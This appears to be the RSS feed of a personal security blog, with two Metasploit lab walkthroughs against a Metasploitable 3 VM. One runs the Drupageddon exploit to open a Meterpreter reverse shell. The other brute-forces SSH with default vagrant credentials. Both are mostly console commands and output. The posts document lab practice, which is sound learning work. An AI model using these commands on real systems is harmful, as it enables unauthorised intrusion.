@@ -1,0 +1,1574 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Metasploit on Abril Jordan Casinillo</title><link>https://abriljordan.github.io/ajcasinillo/tags/metasploit/</link><description>Recent content in Metasploit on Abril Jordan Casinillo</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 18 Jan 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://abriljordan.github.io/ajcasinillo/tags/metasploit/index.xml" rel="self" type="application/rss+xml"/><item><title>Drupal HTTP Parameter Key/Value SQL Injection</title><link>https://abriljordan.github.io/ajcasinillo/p/drupal-http-parameter-key/value-sql-injection/</link><pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/drupal-http-parameter-key/value-sql-injection/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-drupal-http-parameter-keyvalue-sql-injection">Vulnerability: Drupal HTTP Parameter Key/Value SQL Injection
+&lt;/h2>&lt;p>&amp;ldquo;This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32). Two methods are available to trigger the PHP payload on the target: - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal&amp;rsquo;s cache, then trigger the cache entry to execute the payload using a POP chain. - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group, enable Drupal&amp;rsquo;s PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution.&amp;rdquo;&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/" target="_blank" rel="noopener"
+>https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/multi/http/drupal_drupageddon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> No payload configured, defaulting to php/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show targets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit targets:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">0&lt;/span> Drupal 7.0 - 7.31 &lt;span class="o">(&lt;/span>form-cache PHP injection method&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> Drupal 7.0 - 7.31 &lt;span class="o">(&lt;/span>user-post PHP injection method&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> TARGET &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TARGET&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> basics/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">80&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SSL &lt;span class="nb">false&lt;/span> no Negotiate SSL/TLS &lt;span class="k">for&lt;/span> outgoing connections
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TARGETURI / yes The target URI of the Drupal installation
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VHOST no HTTP server virtual host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>php/meterpreter/reverse_tcp&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST 127.0.0.1 yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Drupal 7.0 - 7.31 &lt;span class="o">(&lt;/span>form-cache PHP injection method&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOST 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> LHOST 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> TARGETURI /drupal/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TARGETURI&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; /drupal/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/http/drupal_drupageddon&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP handler on 10.0.2.16:4444
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Sending stage &lt;span class="o">(&lt;/span>&lt;span class="m">39927&lt;/span> bytes&lt;span class="o">)&lt;/span> to 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Meterpreter session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:4444 -&amp;gt; 10.0.2.28:44842&lt;span class="o">)&lt;/span> at 2024-02-20 10:03:59 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/var/www/html/drupal&lt;span class="o">)&lt;/span> &amp;gt; getuid
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server username: www-data
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/var/www/html/drupal&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/var/www/html/drupal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/var/www/html/drupal&lt;span class="o">)&lt;/span> &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Port 22 / SSH Login Check Scanner</title><link>https://abriljordan.github.io/ajcasinillo/p/port-22-/-ssh-login-check-scanner/</link><pubDate>Thu, 18 Jan 2024 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/port-22-/-ssh-login-check-scanner/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-ssh-logins">Vulnerability: ssh logins
+&lt;/h2>&lt;p>Port 22 / SSH Login Check Scanner&lt;/p>
+&lt;p>&amp;ldquo;This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.&amp;rdquo;&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/" target="_blank" rel="noopener"
+>https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; search auxiliary/scanner/ssh/ssh_login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching &lt;span class="nv">Modules&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> auxiliary/scanner/ssh/ssh_login normal No SSH Login Check Scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> auxiliary/scanner/ssh/ssh_login_pubkey normal No SSH Public Key Login Scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 1, use &lt;span class="m">1&lt;/span> or use auxiliary/scanner/ssh/ssh_login_pubkey
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>auxiliary/scanner/ssh/ssh_login&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ANONYMOUS_LOGIN &lt;span class="nb">false&lt;/span> yes Attempt to login with a blank username and password
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BLANK_PASSWORDS &lt;span class="nb">false&lt;/span> no Try blank passwords &lt;span class="k">for&lt;/span> all users
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BRUTEFORCE_SPEED &lt;span class="m">5&lt;/span> yes How fast to bruteforce, from &lt;span class="m">0&lt;/span> to &lt;span class="m">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DB_ALL_CREDS &lt;span class="nb">false&lt;/span> no Try each user/password couple stored in the current database
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DB_ALL_PASS &lt;span class="nb">false&lt;/span> no Add all passwords in the current database to the list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DB_ALL_USERS &lt;span class="nb">false&lt;/span> no Add all users in the current database to the list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DB_SKIP_EXISTING none no Skip existing credentials stored in the current database &lt;span class="o">(&lt;/span>Accepted: none, user, user
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;amp;&lt;/span>realm&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PASSWORD no A specific password to authenticate with
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PASS_FILE no File containing passwords, one per line
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/usi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ng-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">22&lt;/span> yes The target port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> STOP_ON_SUCCESS &lt;span class="nb">false&lt;/span> yes Stop guessing when a credential works &lt;span class="k">for&lt;/span> a host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> THREADS &lt;span class="m">1&lt;/span> yes The number of concurrent threads &lt;span class="o">(&lt;/span>max one per host&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> USERNAME no A specific username to authenticate as
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> USERPASS_FILE no File containing users and passwords separated by space, one pair per line
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> USER_AS_PASS &lt;span class="nb">false&lt;/span> no Try the username as the password &lt;span class="k">for&lt;/span> all users
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> USER_FILE no File containing usernames, one per line
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VERBOSE &lt;span class="nb">false&lt;/span> yes Whether to print output &lt;span class="k">for&lt;/span> all attempts
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOST 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> USERNAME vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">USERNAME&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> PASSWORD vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PASSWORD&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:22 - Starting bruteforce
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.2.28:22 - Success: &lt;span class="s1">&amp;#39;vagrant:vagrant&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> SSH session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:44067 -&amp;gt; 10.0.2.28:22&lt;span class="o">)&lt;/span> at 2024-02-20 13:01:21 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Scanned &lt;span class="m">1&lt;/span> of &lt;span class="m">1&lt;/span> hosts &lt;span class="o">(&lt;/span>100% &lt;span class="nb">complete&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Auxiliary module execution completed
